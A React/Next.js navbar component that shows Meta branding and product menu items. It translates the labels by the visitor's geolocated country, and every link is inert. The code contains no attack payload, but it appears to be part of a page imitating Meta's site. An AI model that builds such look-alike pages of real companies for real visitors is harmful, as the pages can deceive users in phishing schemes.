'use client';

import MetaImage from '@/assets/images/meta-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { type FC, useEffect, useState } from 'react';

const Navbar: FC = () => {
    const [isDropdownOpen, setIsDropdownOpen] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const { geoInfo } = store();

    const menuItems = [
        { label: 'AI glasses', href: '#' },
        { label: 'Meta Quest', href: '#' },
        { label: 'Apps and games', href: '#' }
    ];

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const textsToTranslate = ['AI glasses', 'Meta Quest', 'Apps and games'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };
        translateAll();
    }, [geoInfo]);

    return (
        <nav className='navbar'>
            <div className='navbar-inner'>
                <div className='navbar-spacer' />
                <div className='navbar-brand-row'>
                    <Image src={MetaImage} alt='Meta' width={50} height={16} className='navbar-logo' priority />
                    <div className='navbar-menu'>
                        {menuItems.map((item) => (
                            <a key={item.label} href={item.href} onClick={(e) => e.preventDefault()}>
                                {t(item.label)}
                            </a>
                        ))}
                    </div>
                </div>
                <button
                    type='button'
                    className='navbar-mobile-toggle'
                    aria-label='Menu'
                    aria-expanded={isDropdownOpen}
                    onClick={() => setIsDropdownOpen((open) => !open)}
                >
                    <svg width='20' height='20' fill='none' stroke='currentColor' viewBox='0 0 24 24' aria-hidden='true'>
                        <path strokeLinecap='round' strokeLinejoin='round' strokeWidth={2} d='M4 6h16M4 12h16M4 18h16' />
                    </svg>
                </button>
            </div>
            {isDropdownOpen ? (
                <div className='navbar-mobile-menu md:hidden'>
                    {menuItems.map((item) => (
                        <a key={item.label} href={item.href} onClick={(e) => e.preventDefault()}>
                            {t(item.label)}
                        </a>
                    ))}
                </div>
            ) : null}
        </nav>
    );
};

export default Navbar;
